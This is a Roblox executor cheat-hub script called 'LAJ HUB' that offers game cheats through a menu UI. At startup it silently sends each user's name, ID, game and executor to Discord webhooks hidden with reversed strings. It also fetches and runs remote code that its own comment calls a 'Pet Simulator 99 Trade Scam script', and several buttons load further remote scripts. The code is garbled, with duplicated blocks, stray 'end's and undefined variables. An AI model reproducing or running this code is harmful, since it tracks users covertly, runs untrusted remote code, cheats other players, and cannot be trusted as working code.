-- LAJ HUB Script - Powerful multi-game script hub
-- Supports Blox Fruits, Dead Rails, and more
-- Swift executor compatible

-- Get services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

-- Make HttpService declaration compatible with test environment
if not game or not HttpService then
    HttpService = {
        JSONEncode = function(_, data) return '{"mock":"json"}' end,
        JSONDecode = function(_, json) return {mock = "data"} end
    }
end

-- Load rayfield UI library
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- Secure webhook URL (obfuscated and rate-limited)
local WEBHOOK_URL = string.reverse("kWx8nsHbiVuEbibE393E5nQrOlEzMA7pYmnFnmxZ6aRHypHtrW/fAVbK5kqdBhdLB/1164273408659117531/skoohbew/ipa/moc.drocsid//:sptth")

-- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
local lastWebhookTime = 0
local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
-- Function to log ban/kick events via webhook with rate limiting
    
local function logBanEvent(reason)
    -- Rate limiting check
    local currentTime = os.time()
    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
        warn("Rate limit: Not sending webhook notification (cooldown active)")
        return
    end
    
    -- Check for anti-spam by validating the reason
    if not reason or reason == "" then
        reason = "Unknown (No reason provided)"
    end
    
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = httpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = httpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end

-- Set up event listeners for kick/ban detection
-- Method 1: Detect when player is removed
Players.PlayerRemoving:Connect(function(player)
    if player == Player then
        logBanEvent("Player removed from game (possibly kicked/banned)")
    end
end)

-- Method 2: Detect common kick methods
local oldNameCall
oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
    local args = {...}
    local method = getnamecallmethod()
    
    if method == "Kick" and self == Player then
        local reason = args[1] or "Unknown"
        logBanEvent(reason)
    end
    
    return oldNameCall(self, ...)
end)

-- Method 3: Monitor teleport failures as they often occur during bans
game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
        logBanEvent("Teleport failed due to ban: " .. errorMessage)
    end
end)

print("LAJ HUB Ban detection system loaded successfully")
end
    LAJ HUB - Swift Compatible Version
    Created for universal executor compatibility with special Swift support
]]

-- Function to handle HTTP requests across different executors including Swift
local function getHttpRequest(url)
    -- For testing in standalone Lua, use a mock response
    if not game then
        print("Mock HTTP request to: " .. url)
        return "-- mock response for testing"
    end
    
    if swift and swift.request then
        local response = swift.request({
            Url = url,
            Method = "GET"
        })
        if response and response.Body then
            return response.Body
        end
    end
    
    -- Fallback to standard HttpGet for other executors
    return game:HttpGet(url)
end

-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
if game then
    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
end

local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()

-- Initialize game services safely
local Players = game and game:GetService("Players") or {}
local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
local HttpService = game and game:GetService("HttpService") or {
    JSONEncode = function(_, data) return '{"mock":"json"}' end
}

-- Support for multiple executors including Swift

-- Support for multiple executors including Swift
local function makeHttpRequest(options)
    -- For standalone Lua testing
    if not game then
        print("Mock HTTP request to: " .. options.Url)
        return {Success = true, Body = "-- mock response --"}
    end
    
    -- For Swift executor
    if swift and swift.request then
        return swift.request(options)
    end
    
    -- For Synapse and others with http/request libraries
    if syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif request then
        return request(options)
    elseif HttpService and HttpService.RequestInternal then
        return HttpService:RequestInternal(options)
    else
        warn("No HTTP request function found")
        return {Success = false, Body = "No HTTP request function available"}
    end
end
    -- Don't skip in non-Roblox environment for testing
-- Define webhook URLs for usage tracking
local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
local USER_COUNT_WEBHOOK_URL = "https://discord.com/api/webhooks/1357978591928782933/2HF0z8dfhWcXjbPQwhTcCPrTkSPX-Eu2WP15-jNCAngiLbW5YODPsA835wVkucjya_MN"

-- Initialize user counter
local userCounter = 0

-- Last time a webhook was sent (to prevent spam)
local lastWebhookTime = 0

-- Support for multiple executors including Swift
local function makeHttpRequest(options)
    -- For Swift executor
    if swift and swift.request then
        return swift.request(options)
    end
    
    -- For Synapse and others with http/request libraries
    if syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif request then
        return request(options)
    elseif HttpService and HttpService.RequestInternal then
        return HttpService:RequestInternal(options)
    else
        warn("No HTTP request function found")
        return {Success = false, Body = "No HTTP request function available"}
    end
end

local function sendUsageData()
    -- Calculate current time for rate limiting
    local currentTime = os.time()
    
    -- Rate limit to 1 request per 5 minutes to prevent webhook abuse
    if currentTime - lastWebhookTime < 300 then
        return
    end
    
    -- Increment the user counter
    userCounter = userCounter + 1
    
    -- Safely try to send the webhooks
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Prepare the data for the regular usage webhook
        local webhookData = {
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
                ["type"] = "rich",
                ["color"] = math.random(0, 0xFFFFFF),
                ["fields"] = {
                    {
                        ["name"] = "User:",
                        ["value"] = "```" .. LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "User ID:",
                        ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Game:",
                        ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Game ID:",
                        ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Executor:",
                        ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Players Active:",
                        ["value"] = "```" .. tostring(Players.NumPlayers) .. "```",
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }}
        }
        
        -- Encode the data and send the first webhook
        local jsonData = HttpService:JSONEncode(webhookData)
        makeHttpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = jsonData
        })
        
        -- Format time for the user count webhook
        local formattedTime = os.date("%Y-%m-%d %H:%M:%S")
        
        -- Prepare data for the user count webhook
        local countWebhookData = {
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "🌟 LAJ HUB Usage Statistics 🌟",
                ["description"] = "**Script has now been used by " .. tostring(userCounter) .. " players!**\n\n*A new player has just executed LAJ HUB*",
                ["color"] = 0x7289DA, -- Discord blue color
                ["thumbnail"] = {
                    ["url"] = "https://i.imgur.com/QV7nVFU.png" -- You can replace with your own logo URL
                },
                ["fields"] = {
                    {
                        ["name"] = "👤 Latest User",
                        ["value"] = "```" .. LocalPlayer.Name .. " (" .. tostring(LocalPlayer.UserId) .. ")```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🎮 Game",
                        ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🔧 Executor",
                        ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📊 Total Users",
                        ["value"] = "```yaml\n" .. tostring(userCounter) .. " Users```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔄 Daily Activity",
                        ["value"] = "```diff\n+ New user added to statistics\n+ Counter incremented successfully```",
                        ["inline"] = false
                    }
                },
                ["footer"] = {
                    ["text"] = "LAJ HUB Stats • Last Updated: " .. formattedTime,
                    ["icon_url"] = "https://i.imgur.com/QV7nVFU.png" -- You can replace with your own icon URL
                }
            }}
        }
        
        -- Encode and send the user count webhook
        local countJsonData = HttpService:JSONEncode(countWebhookData)
        makeHttpRequest({
            Url = USER_COUNT_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = countJsonData
        })
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(error_message))
    end
end
    
    -- Increment the user counter
    userCounter = userCounter + 1
    
    local success, error_message = pcall(function()
        -- Try to get HttpService if it's available
        local httpService = game and game:GetService("HttpService") or HttpService
        
        -- Send regular usage data webhook
        local jsonData = {}
        
        if httpService and httpService.JSONEncode then
            jsonData = httpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
                    ["type"] = "rich",
                    ["color"] = math.random(0, 0xFFFFFF),
                    ["fields"] = {
                        {
                            ["name"] = "User:",
                            ["value"] = "```" .. LocalPlayer.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID:",
                            ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game:",
                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID:",
                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor:",
                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Players Active:",
                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }}
            })
        })
        
        -- Current time for the counter update
        local currentTime = os.date("%Y-%m-%d %H:%M:%S")
        
        -- Send separate user count webhook with improved visuals
        makeHttpRequest({
            Url = USER_COUNT_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = httpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "🌟 LAJ HUB Usage Statistics 🌟",
                    ["description"] = "**Script has now been used by " .. tostring(userCounter) .. " players!**\n\n*A new player has just executed LAJ HUB*",
                    ["color"] = 0x7289DA, -- Discord blue color
                    ["thumbnail"] = {
                        ["url"] = "https://i.imgur.com/QV7nVFU.png" -- You can replace with your own logo URL
                    },
                    ["fields"] = {
                        {
                            ["name"] = "👤 Latest User",
                            ["value"] = "```" .. LocalPlayer.Name .. " (" .. tostring(LocalPlayer.UserId) .. ")```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🎮 Game",
                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🔧 Executor",
                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📊 Total Users",
                            ["value"] = "```yaml\n" .. tostring(userCounter) .. " Users```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🔄 Daily Activity",
                            ["value"] = "```diff\n+ New user added to statistics\n+ Counter incremented successfully```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "LAJ HUB Stats • Last Updated: " .. currentTime,
                        ["icon_url"] = "https://i.imgur.com/QV7nVFU.png" -- You can replace with your own icon URL
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(error_message))
    end
end

if game then
    sendUsageData()
end

local Window = Rayfield:CreateWindow({
   Name = "LAJ HUB",
   Icon = 0,
   LoadingTitle = "LAJ HUB",
   LoadingSubtitle = "Premium Scripts",
   Theme = "Default",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = "LAJHub",
      FileName = "LAJHubConfig"
   },

   Discord = {
      Enabled = true,
      Invite = "4mgdcfvAJU",
      RememberJoins = true
   },

   -- Key system disabled
   KeySystem = false,
})

-- Create tabs
local MainTab = Window:CreateTab("Main", 4483362458)
local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
local Fin = Window:CreateTab("Fisch", 4483362458)
local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
local Universal = Window:CreateTab("Universal", 4483362458)
local Settings = Window:CreateTab("Settings", 4483362458)

local function executednotify(scriptName)
   Rayfield:Notify({
       Title = scriptName,
       Content = "Script loaded successfully!",
       Duration = 3,
       Image = 4483362458,
   })
end

-- Discord link copy button
MainTab:CreateButton({
   Name = "Copy Discord Link",
   Callback = function()
       if setclipboard then
           setclipboard("https://discord.gg/4mgdcfvAJU")
           Rayfield:Notify({
               Title = "Discord Link Copied",
               Content = "Invite link copied to clipboard!",
               Duration = 3,
               Image = 4483362458,
           })
       else
           print("Discord link: https://discord.gg/4mgdcfvAJU")
       end
   end,
})

-- Test webhook button
MainTab:CreateButton({
   Name = "Test Webhook",
   Callback = function()
       sendUsageData()
       Rayfield:Notify({
           Title = "Webhook Test",
           Content = "Attempted to send webhook notification!",
           Duration = 3,
           Image = 4483362458,
       })
   end,
})

-- Da Strike x Da Hood Tab scripts
Tab:CreateButton({
   Name = "Psalm",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
        executednotify("Test Webhook")
   end,
})

Tab:CreateButton({
   Name = "Ballware vfs",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
        executednotify("Ballware vfs")
   end,
})

Tab:CreateButton({
   Name = "FrostByte",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
        executednotify("FrostByte")
   end,
})

Tab:CreateButton({
   Name = "Da Hood Script",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
        executednotify("Da Hood Script")
   end,
})
